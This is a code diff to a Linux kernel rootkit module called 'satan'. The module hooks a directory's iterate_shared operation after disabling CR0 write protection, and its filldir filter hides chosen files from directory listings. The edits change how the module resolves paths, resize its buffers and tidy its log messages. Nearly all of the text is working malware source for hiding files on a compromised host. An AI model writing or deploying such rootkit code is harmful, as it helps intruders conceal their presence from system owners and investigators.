@@ -44,11 +44,11 @@ asmlinkage long satan_lstat64(const char __user *filename,
 }
 
 
-#define BASENAME_BUF_SIZE 256
-#define FILENAME_BUF_SIZE 256
+#define BASENAME_BUF_SIZE 128
+#define FILENAME_BUF_SIZE 128
 static char basename_buf[BASENAME_BUF_SIZE] = {0};
 static char filename_buf[BASENAME_BUF_SIZE] = {0};
-
+static char *basename = NULL;
 
 struct hidden_file {
         char *basename;
@@ -97,7 +97,7 @@ static int hidden_files_del(const char *path)
                 f = list_entry(p, struct hidden_file, list);
 
                 if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, filename_buf)) {
-                        pr_info("satan: file: removing (%s,%s) from list of hidden files .\n", f->basename, f->filename);
+                        pr_info("satan: file: removing (%s,%s) from list of hidden files.\n", f->basename, f->filename);
                         list_del(p);
                         kfree(f->basename);
                         kfree(f->filename);
@@ -198,6 +198,8 @@ static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file 
                 pr_alert("satan: failed to open %s:\n", f->basename);
                 return 1;
         } else {
+                f_op = (struct file_operations *) filp->f_op;
+
                 CR0_WP_DISABLE {
                         pr_info("satan: restoring iterate_shared from %p to %p\n",
                                 f_op->iterate_shared, real_iterate_shared);
@@ -210,9 +212,13 @@ static int satan_file_unhook_parent_dir_iterate_shared(const struct hidden_file 
 
 static int satan_iterate_shared(struct file *filp, struct dir_context *ctx)
 {
-        // Copy the absolute path of filp into `basename_buf`.
+        // Get the absolute path of `filp` via `d_path()`.
+        // I've tried `dentry_path_raw()` but it always returns a wrong path :(
         memset(basename_buf, 0, BASENAME_BUF_SIZE);
-        dentry_path_raw(filp->f_path.dentry, basename_buf, BASENAME_BUF_SIZE);
+        basename = d_path(&filp->f_path, basename_buf, BASENAME_BUF_SIZE);
+
+        pr_info("satan: basename %s\n", basename);
+
 
         real_filldir = ctx->actor;
 
@@ -235,12 +241,12 @@ static int satan_filldir(struct dir_context *ctx, const char *name, int namlen,
                 f = list_entry(p, struct hidden_file, list);
 
                 // At this point:
-                // 1. Current basename is stored in `basename_buf`.
+                // 1. Current basename is stored in `basename`.
                 // 2. Current filename is stored in `name`.
                 pr_info("satan: comparing: (%s,%s) and (%s,%s)\n",
-                        f->basename, basename_buf, f->filename, name);
+                        f->basename, basename, f->filename, name);
 
-                if (!strcmp(f->basename, basename_buf) && !strcmp(f->filename, name)) {
+                if (!strcmp(f->basename, basename) && !strcmp(f->filename, name)) {
                         pr_info("satan: hiding: %s", name);
                         return 0;
                 }
